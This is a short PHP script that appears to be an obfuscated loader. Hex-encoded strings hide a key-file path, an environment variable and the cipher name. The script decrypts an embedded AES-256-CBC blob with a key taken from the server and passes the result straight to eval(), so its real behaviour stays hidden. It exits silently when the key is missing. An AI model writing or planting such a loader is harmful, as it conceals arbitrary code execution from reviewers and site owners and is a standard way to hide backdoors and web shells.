<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('uch95CvH04nSsgiP7rymdg==');

$c=base64_decode(

'7CiA0CNmgUr3jplZdxb6T1JPSvP2TsEeO6QeFsUoWB6qFNuxIhSNCg+MqfLB+ZZc6eelAyTpbHVq' .
'nSZRq42+T6beKIGqwg25YBNoX0NWQeB7J/yowiOMLZpjChQNujq/SvJudoFc2bsWZzQOnxOl+xSI' .
'w4tcjBD+Gw5hN8/2iXl1RSgSXs2zaVtngksZfov3cQWW2l6u2HygnFZJ4/kqyPodfa94PNe0lq0/' .
'I7DE7XbjME5WnTue39ozpch/XCtNtKESK+zB0cyofQD+4axJccp/4Jr8P9sb3AxCyb1lqLYZnKjA' .
'1gff9Rw3uzEsS+isJsKFivAp4+ANbGJoHz4jScqROpdbLQ2r2dD5nryF/lSofjEuPoiLEJFyduXh' .
'7fbeaZvo1RrvdSUEssMNEjDLKCayQ/8TJwkT19Euy1zObzXvEXQx2sM/IlLrfxF0hzeVKqpkDB/y' .
'gyrJp6d2yCiQBg2WLbb9O22wAq53/Xct4NFNbKJ9XnqOml2AQrCQ53Tqc6dg3WATKCIBw+L3oDwq' .
'f8tHS+ncs5OuWku72bv22FjO+Gtu1UoJY9u9lSfZVkb3XFA/884hR7O50XrXONnq7vlc4c2en1Bg' .
'wRCjzJL8aKW0IR2D6rnIafxWtwQ+elwfT5nZM1ONtK8Un93NM4bG4n6rsVfT1e2n5DVfpnnVLUoC' .
'bEeq73LgPlYw4tpbMsYmL8FsXfsEXkrX98RS9gzPMcvbjroriCIkI12PiMnZCD30CydGaQwWrB+h' .
'TTIpS3zmnRVSNKJLYvuogSLzKxU5QI3st901+KZ6n42R6QyUvHzBVpl9FSAQe37lV+C6XQYprmKi' .
'rORlTOixLds2ebhSpQJfBBDVDWWOyltw0+gEUkQlPl4nC70zuW4DZuQ9xgVpuQ/O5GKZzZe8n7Xn' .
'MlcEf53BmUuMx5LIn71Isul1oLKdqTih9lgLbOTR3+LXwg8rQiPKk0NouFsjvFlJ0qw8rU5nfwT4' .
'Hoozc4Z8W1FnpGwYrB76eFkRuP+MNmE7dgJpWazSvJMBGoFHs/GRo7BerII3wzryzjRDeQPGFJtF' .
'9r8GLBgFVv2JmVmV8+4XtZ4sZZ8ID8TpunvIg7RDzM++bJavPp/i8attS/KC3hpNvI15vv812Um3' .
'zaGG9Be/5OonmyWyTMjwo+NottiXIjC/UT2FKtzGb3sJG2y8fhYuS4UDCIFX2dBLpND+mPDS5SfU' .
'wkLiQ1Vd9wlhpax7jEF9SStcFoO2TM6UvlsxGxR9lZaydPGKcpEVkRMOb+LP4+ola7v6TS2IL9O7' .
'aY9W6g4/dnH28R0MtlRb2ja4vhWOLqG0Vf/0xCAiXNEXx3+CK/Ho/aILiCQ4nPlqRtOEX6Ydow=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

